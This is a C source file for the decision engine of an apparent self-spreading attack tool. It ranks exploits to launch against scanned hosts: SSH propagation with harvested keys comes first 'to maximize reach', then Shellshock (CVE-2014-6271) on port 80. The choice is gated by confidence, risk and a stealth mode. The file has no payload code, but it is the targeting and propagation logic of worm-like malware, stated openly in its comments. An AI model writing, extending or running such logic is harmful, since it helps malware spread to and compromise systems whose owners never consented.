#include "decision_engine.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static cve_decision_rule_t decision_rules[MAX_CVE_HANDLERS];
static int num_rules = 0;

// Initialize decision rules
// Rules are evaluated in priority_order (lower number = higher priority)
// Each rule defines conditions that must be met for a CVE to be selected
void init_decision_rules(void) {
    num_rules = 0;
    
    // SSH Propagation: Highest priority (0) - spread first to maximize reach
    // Requires: vulnerable (keys found + port 22 open), confidence >= 7, risk <= 6
    decision_rules[0].cve_id = CVE_SSH_PROPAGATION;
    decision_rules[0].priority_order = 0;
    decision_rules[0].requires_vulnerable = 1;
    decision_rules[0].requires_port_open = 22;
    decision_rules[0].min_confidence = 7;
    decision_rules[0].max_risk_level = 6;
    decision_rules[0].stealth_required = 0;
    num_rules = 1;
    
    // Shellshock: Lower priority (1) - exploit after propagation
    // Requires: vulnerable, port 80 open, confidence >= 7, risk <= 5
    decision_rules[1].cve_id = CVE_2014_6271;
    decision_rules[1].priority_order = 1;
    decision_rules[1].requires_vulnerable = 1;
    decision_rules[1].requires_port_open = 80;
    decision_rules[1].min_confidence = 7;
    decision_rules[1].max_risk_level = 5;
    decision_rules[1].stealth_required = 0;
    num_rules = 2;
}

// Check if CVE is vulnerable
static int check_vulnerable(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    if (!rule->requires_vulnerable) {
        return 1;  // No requirement
    }
    
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return results->results[i].is_vulnerable;
        }
    }
    return 0;
}

// Check port requirement
static int check_port(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    if (rule->requires_port_open == 0) {
        return 1;  // No port requirement
    }
    
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return (results->results[i].port_open == rule->requires_port_open);
        }
    }
    return 0;
}

// Check confidence requirement
static int check_confidence(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return (results->results[i].confidence >= rule->min_confidence);
        }
    }
    return 0;
}

// Check risk level
static int check_risk(cve_decision_rule_t* rule, risk_assessment_t* risk) {
    return (risk->total_risk <= rule->max_risk_level);
}

// Check mode compatibility
static int check_mode(cve_decision_rule_t* rule, degradation_mode_t mode) {
    if (rule->stealth_required) {
        return (mode == MODE_STEALTH);
    }
    return (mode == MODE_NORMAL || mode == MODE_STEALTH);
}

// Main decision function (Phase 2)
// Implements priority-based CVE selection algorithm:
// 1. Iterate rules in priority order (rules array is pre-sorted)
// 2. For each rule, check all conditions (vulnerable, port, confidence, risk, mode)
// 3. First rule that passes all checks is selected
// 4. If no rule passes, no execution is performed
decision_result_t make_decision(cve_result_vector_t* scan_results, 
                                risk_assessment_t* risk, 
                                degradation_mode_t mode) {
    decision_result_t result = {0};
    
    // Evaluate rules in priority order (lower priority_order value = higher priority)
    for (int i = 0; i < num_rules; i++) {
        cve_decision_rule_t* rule = &decision_rules[i];
        
        // All conditions must pass for this CVE to be selected
        if (!check_vulnerable(rule, scan_results)) continue;
        if (!check_port(rule, scan_results)) continue;
        if (!check_confidence(rule, scan_results)) continue;
        if (!check_risk(rule, risk)) continue;
        if (!check_mode(rule, mode)) continue;
        
        // All checks passed - select this CVE and return immediately
        result.selected_cve_id = rule->cve_id;
        result.should_execute = 1;
        return result;
    }
    
    // No suitable CVE found
    result.should_execute = 0;
    return result;
}

